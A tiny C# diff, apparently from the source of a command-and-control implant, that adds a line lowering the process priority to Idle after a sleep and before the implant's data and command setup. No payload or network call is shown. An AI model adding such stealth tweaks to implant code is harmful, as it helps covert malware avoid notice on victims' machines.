@@ -66,6 +66,8 @@ namespace Implant
 
             Thread.Sleep(10000);
 
+            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;
+
             GenImplantData();
             ImplantCommandsInit();
 
